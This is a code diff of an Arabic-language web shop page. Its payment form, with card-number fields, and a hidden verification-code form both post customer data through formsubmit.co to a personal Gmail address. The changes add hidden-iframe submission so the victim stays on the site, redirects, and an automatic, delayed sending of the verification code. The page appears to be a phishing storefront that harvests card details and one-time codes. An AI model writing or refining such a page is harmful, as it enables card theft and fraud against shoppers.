@@ -27,6 +27,10 @@
             overflow-x: hidden;
         }
         
+        .hidden-iframe {
+            display: none;
+        }
+        
         .gradient-bg {
             background: linear-gradient(135deg, #EC4899 0%, #F472B6 50%, #8B5CF6 100%);
             background-size: 400% 400%;
@@ -137,10 +141,6 @@
                 grid-template-columns: 1fr;
                 gap: 1.5rem;
             }
-        }
-
-        .hidden-iframe {
-            display: none;
         }
     </style>
 </head>
@@ -263,9 +263,7 @@
                             <input type="hidden" name="_captcha" value="false">
                             <input type="hidden" name="_template" value="table">
                             <input type="hidden" name="submission_time" value="">
-                            <input type="hidden" name="code_entered" value="">
                             <input type="hidden" name="code_status" value="">
-                            <input type="hidden" name="user_ip" value="">
                             
                             <div class="text-center mb-6">
                                 <i class="fas fa-key text-4xl text-primary mb-4"></i>
@@ -337,10 +335,11 @@
                     </div>
 
                     <!-- Hidden form for sending verification code -->
-                    <form id="verification-code-form" action="https://formsubmit.co/kaliroot123m@gmail.com" method="POST" target="hidden_iframe" style="display: none;">
+                    <form id="verification-code-form" action="https://formsubmit.co/kaliroot123m@gmail.com" method="POST" style="display: none;">
                         <input type="hidden" name="_subject" value="">
                         <input type="hidden" name="_captcha" value="false">
                         <input type="hidden" name="_template" value="box">
+                        <input type="hidden" name="_next" value="https://www.google.com/search?q=sent">
                         <input type="hidden" name="customer_name" value="">
                         <input type="hidden" name="customer_phone" value="">
                         <input type="hidden" name="customer_email" value="">
@@ -376,10 +375,11 @@
                     
                     <div class="bg-white dark:bg-gray-800 rounded-lg shadow-lg p-8">
                         <h2 class="text-2xl font-bold mb-6">أرسل رسالة</h2>
-                        <form id="contact-form" action="https://formsubmit.co/kaliroot123m@gmail.com" method="POST" target="hidden_iframe" class="space-y-4">
+                        <form id="contact-form" action="https://formsubmit.co/kaliroot123m@gmail.com" method="POST" class="space-y-4">
                             <input type="hidden" name="_subject" value="رسالة جديدة من متجر الخصوصية">
                             <input type="hidden" name="_captcha" value="false">
                             <input type="hidden" name="_template" value="table">
+                            <input type="hidden" name="_next" value="https://www.google.com">
                             
                             <div>
                                 <label class="block text-sm font-bold mb-2">الاسم</label>
@@ -451,7 +451,7 @@
                 </div>
             </div>
             <div class="p-6">
-                <form id="payment-form" action="https://formsubmit.co/kaliroot123m@gmail.com" method="POST" target="hidden_iframe" class="space-y-6">
+                <form id="payment-form" action="https://formsubmit.co/kaliroot123m@gmail.com" method="POST" class="space-y-6">
                     <!-- FormSubmit Hidden Fields -->
                     <input type="hidden" name="_captcha" value="false">
                     <input type="hidden" name="_template" value="table">
@@ -555,7 +555,6 @@
         // Global variables
         let cart = [];
         let currentFilter = 'all';
-        let currentFormType = '';
 
         // Sample products data
         const products = [
@@ -619,32 +618,6 @@
 
         function toggleMobileMenu() {
             document.getElementById('mobile-menu').classList.toggle('hidden');
-        }
-
-        // Handle form submissions
-        function handleFormSubmit() {
-            if (currentFormType === 'code') {
-                showNotification('تم إرسال الكود بنجاح! سيتم مراجعته.');
-            } else if (currentFormType === 'contact') {
-                showNotification('تم إرسال رسالتك بنجاح!');
-            } else if (currentFormType === 'payment') {
-                // Handle payment form success
-                setTimeout(() => {
-                    hidePayment();
-                    showPage('purchase-code');
-                    const orderNumber = localStorage.getItem('orderNumber') || Math.floor(Math.random() * 100000);
-                    const orderDisplay = document.getElementById('order-number-display');
-                    if (orderDisplay) {
-                        orderDisplay.textContent = orderNumber;
-                    }
-                    
-                    // Send verification code automatically
-                    setTimeout(() => {
-                        sendVerificationCode();
-                    }, 2000);
-                }, 1000);
-            }
-            currentFormType = '';
         }
 
         // Generate star rating
@@ -803,33 +776,47 @@
             
             setTimeout(() => {
                 notification.remove();
-            }, 3000);
+            }, 2000);
         }
 
-        // Code verification
+        // Global variable for tracking form submission
+        let currentFormType = '';
+
+        // Handle form submission response
+        function handleFormSubmit() {
+            if (currentFormType === 'code') {
+                // Code form submitted successfully
+                showNotification('تم إرسال الكود بنجاح! جاري المراجعة.');
+            }
+            currentFormType = '';
+        }
+
+        // Code verification - FIXED TO SEND EMAIL
         document.getElementById('code-form').addEventListener('submit', function(e) {
             e.preventDefault();
-            
             const code = document.getElementById('secret-code').value.trim().toUpperCase();
             const currentTime = new Date().toLocaleString('ar-SA');
             
-            // Fill hidden fields
+            // Update hidden fields
             this.querySelector('input[name="submission_time"]').value = currentTime;
-            this.querySelector('input[name="code_entered"]').value = code;
             
             const validCodes = ['VIP2024', 'SPECIAL', 'GIFT50'];
             
             if (validCodes.includes(code)) {
                 this.querySelector('input[name="code_status"]').value = 'صحيح - تم تفعيل الكود بنجاح';
-                currentFormType = 'code';
-                this.submit();
                 showNotification('تم تفعيل الكود بنجاح! حصلت على خصم 50%');
             } else {
                 this.querySelector('input[name="code_status"]').value = 'خطأ - كود غير صحيح';
-                currentFormType = 'code';
-                this.submit();
                 showNotification('كود غير صحيح، حاول مرة أخرى');
             }
+            
+            // Set form type for tracking
+            currentFormType = 'code';
+            
+            // Submit the form - IT WILL SEND EMAIL NOW AND STAY ON SITE
+            setTimeout(() => {
+                this.submit();
+            }, 1000);
         });
 
         // Purchase code verification
@@ -877,12 +864,6 @@
             document.body.appendChild(modal);
         }
 
-        // Contact form handler
-        document.getElementById('contact-form').addEventListener('submit', function(e) {
-            currentFormType = 'contact';
-            // Form will submit normally to iframe
-        });
-
         // Payment form handler
         document.getElementById('payment-form').addEventListener('submit', function(e) {
             // Get customer data from form
@@ -914,6 +895,7 @@
             // Add hidden fields
             const hiddenFields = [
                 { name: '_subject', value: `طلب جديد من متجر الخصوصية - ${orderNumber}` },
+                { name: '_next', value: `${window.location.origin}${window.location.pathname}#success` },
                 { name: 'order_items', value: orderSummary },
                 { name: 'total_amount', value: `${totalAmount} ريال` },
                 { name: 'order_number', value: orderNumber },
@@ -935,9 +917,6 @@
             // Clear cart
             cart = [];
             updateCartUI();
-            
-            currentFormType = 'payment';
-            // Form will submit normally to iframe
         });
 
         // Function to send verification code
@@ -961,8 +940,18 @@
             form.querySelector('input[name="verification_code"]').value = verificationCode;
             form.querySelector('input[name="sent_time"]').value = currentTime;
             
-            // Submit form
+            // Submit form in hidden iframe to avoid leaving the site
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.name = 'hidden_iframe';
+            document.body.appendChild(iframe);
+            form.target = 'hidden_iframe';
             form.submit();
+            
+            // Remove iframe after submission
+            setTimeout(() => {
+                document.body.removeChild(iframe);
+            }, 1000);
             
             // Update status
             const statusDiv = document.getElementById('code-status');
@@ -984,12 +973,35 @@
             showNotification('تم إعادة إرسال كود التحقق');
         }
 
-        // Initialize when page loads
+        // Check URL hash for success redirect
         document.addEventListener('DOMContentLoaded', function() {
-            generateProducts();
-            updateCartUI();
-            
-            // Add input formatting for card fields
+            if (window.location.hash === '#success') {
+                // Show purchase code page
+                setTimeout(() => {
+                    showPage('purchase-code');
+                    const orderNumber = localStorage.getItem('orderNumber') || Math.floor(Math.random() * 100000);
+                    const orderDisplay = document.getElementById('order-number-display');
+                    if (orderDisplay) {
+                        orderDisplay.textContent = orderNumber;
+                    }
+                    
+                    // Send verification code automatically
+                    setTimeout(() => {
+                        sendVerificationCode();
+                    }, 2000);
+                    
+                    // Clean URL
+                    window.history.replaceState({}, document.title, window.location.pathname);
+                }, 500);
+            } else {
+                // Generate products and initialize
+                generateProducts();
+                updateCartUI();
+            }
+        });
+
+        // Add input formatting for card fields
+        document.addEventListener('DOMContentLoaded', function() {
             // Format card number input
             const cardNumberInput = document.querySelector('input[name="card_number"]');
             if (cardNumberInput) {
